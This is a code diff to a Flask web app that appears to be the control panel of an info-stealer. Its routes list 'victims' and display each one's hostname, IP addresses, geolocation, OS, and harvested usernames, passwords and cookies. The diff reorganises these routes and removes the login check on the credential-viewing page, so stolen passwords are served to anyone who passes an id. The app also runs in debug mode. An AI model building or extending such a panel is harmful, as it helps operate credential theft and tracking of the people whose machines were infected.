@@ -25,6 +25,14 @@ def get_db_connection():
 def allowed_file(filename):
     return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
 
+def get_victim(victim_id):
+    conn = get_db_connection()
+    cursor = conn.cursor(DictCursor)
+    cursor.execute("SELECT id, username FROM system_info WHERE id = %s", (victim_id,))
+    victim = cursor.fetchone()
+    conn.close()
+    return victim
+
 @app.route('/')
 def index():
     if 'username' in session:
@@ -59,7 +67,6 @@ def dashboard():
     cursor.execute("SELECT username FROM list_admin WHERE id = %s", (user_id,))
     user_data = cursor.fetchone()
     conn.close()
-    
     return render_template('dashboard.html', user=user_data)
 
 @app.route('/victim')
@@ -71,34 +78,6 @@ def victim():
     user_data = cursor.fetchone()
     conn.close()
     return render_template('victim.html')
-
-@app.route('/get_victims', methods=['GET'])
-def get_victims():
-    conn = get_db_connection()
-    cursor = conn.cursor(DictCursor)
-    
-    cursor.execute("SELECT id, username, hostname, local_ip, created_at FROM system_info")
-    victims = cursor.fetchall()
-    
-    conn.close()
-
-    return jsonify(victims)
-
-@app.route('/overview')
-def overview():
-    victim_id = request.args.get('id')  
-
-    conn = get_db_connection()
-    cursor = conn.cursor(DictCursor)
-    cursor.execute("SELECT id, username, hostname, local_ip, public_ip, created_at, city, region, country, os, latitude, " \
-            "longitude, packets_sent, packets_recv, usernames, passwords FROM system_info WHERE id = %s", (victim_id,))
-    victim = cursor.fetchone()
-    conn.close()
-
-    if victim:
-        return render_template('overview.html', victim=victim)
-    else:
-        return "Victim not found", 404
 
 @app.route('/settings', methods=['GET', 'POST'])
 def settings():
@@ -129,7 +108,6 @@ def settings():
                 filename = secure_filename(file.filename)
                 file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                 file.save(file_path)
-
                 cursor.execute("UPDATE list_admin SET profile_picture = %s WHERE id = %s", (filename, user_id))
 
         conn.commit()
@@ -137,27 +115,53 @@ def settings():
         return redirect(url_for('settings'))
 
     conn.close()
-
     return render_template('settings.html', user=user_data)
+
+@app.route('/get_victims', methods=['GET'])
+def get_victims():
+    conn = get_db_connection()
+    cursor = conn.cursor(DictCursor)
+    cursor.execute("SELECT id, username, hostname, local_ip, created_at FROM system_info")
+    victims = cursor.fetchall()
+    conn.close()
+    return jsonify(victims)
+
+@app.route('/overview')
+def overview():
+    victim_id = request.args.get('id')
+    victim = get_victim(victim_id)
+
+    conn = get_db_connection()
+    cursor = conn.cursor(DictCursor)
+    cursor.execute("SELECT * FROM system_info WHERE id = %s", (victim_id,))
+    victim_data = cursor.fetchone()
+    conn.close()
+
+    if victim and victim_data:
+        return render_template('overview.html', victim=victim_data)
+    else:
+        return "Victim not found", 404
 
 @app.route('/device')
 def device():
     victim_id = request.args.get('id')
+    victim = get_victim(victim_id)
 
     conn = get_db_connection()
     cursor = conn.cursor(DictCursor)
-    cursor.execute("SELECT username, hostname, local_ip, created_at, city, region, country, os FROM system_info WHERE id = %s", (victim_id,))
-    victim = cursor.fetchone()
+    cursor.execute("SELECT * FROM system_info WHERE id = %s", (victim_id,))
+    victim_data = cursor.fetchone()
     conn.close()
 
-    if victim:
-        return render_template('device.html', victim=victim)
+    if victim and victim_data:
+        return render_template('device.html', victim=victim_data)
     else:
         return "Victim not found", 404
 
 @app.route('/history')
 def history():
     victim_id = request.args.get('id')
+    victim = get_victim(victim_id)
 
     conn = get_db_connection()
     cursor = conn.cursor(DictCursor)
@@ -165,29 +169,31 @@ def history():
     victim_history = cursor.fetchone()
     conn.close()
 
-    if victim_history:
-        return render_template('history.html', victim_history=victim_history)
+    if victim and victim_history:
+        return render_template('history.html', victim_history=victim_history, victim=victim)
     else:
         return "Victim not found", 404
 
 @app.route('/network')
 def network():
     victim_id = request.args.get('id')
+    victim = get_victim(victim_id)
 
     conn = get_db_connection()
     cursor = conn.cursor(DictCursor)
     cursor.execute("SELECT packets_sent, packets_recv, created_at FROM system_info WHERE id = %s", (victim_id,))
     network_data = cursor.fetchall()
     conn.close()
-
-    if network_data:
-        return render_template('network.html', network_data=network_data)
+    
+    if victim and network_data:
+        return render_template('network.html', network_data=network_data, victim=victim)
     else:
         return "Network data not found", 404
 
 @app.route('/location')
 def location():
     victim_id = request.args.get('id')
+    victim = get_victim(victim_id)
 
     conn = get_db_connection()
     cursor = conn.cursor(DictCursor)
@@ -195,25 +201,26 @@ def location():
     victim_location = cursor.fetchone()
     conn.close()
 
-    if victim_location:
-        return render_template('location.html', victim_location=victim_location)
+    if victim and victim_location:
+        return render_template('location.html', victim_location=victim_location, victim=victim)
     else:
         return "Location not found", 404
 
 @app.route('/passcookies')
 def passcookies():
-    user_id = session.get('id')
-
-    if not user_id:
-        return redirect(url_for('login'))
+    victim_id = request.args.get('id')
+    victim = get_victim(victim_id)
 
     conn = get_db_connection()
     cursor = conn.cursor(DictCursor)
-    cursor.execute("SELECT * FROM password_cookies WHERE user_id = %s", (user_id,))
-    passcookies_data = cursor.fetchall()
+    cursor.execute("SELECT url, usernames, passwords FROM system_info WHERE id = %s", (victim_id,))
+    victim_data = cursor.fetchone()
     conn.close()
 
-    return render_template('passcookies.html', passcookies_data=passcookies_data)
+    if victim and victim_data:
+        return render_template('passcookies.html', victim_data=victim_data, victim=victim)
+    else:
+        return "Victim not found", 404
 
 @app.route('/static/<path:filename>')
 def serve_static(filename):
@@ -226,4 +233,3 @@ def logout():
 
 if __name__ == '__main__':
     app.run(debug=True)
-#ikan sambal
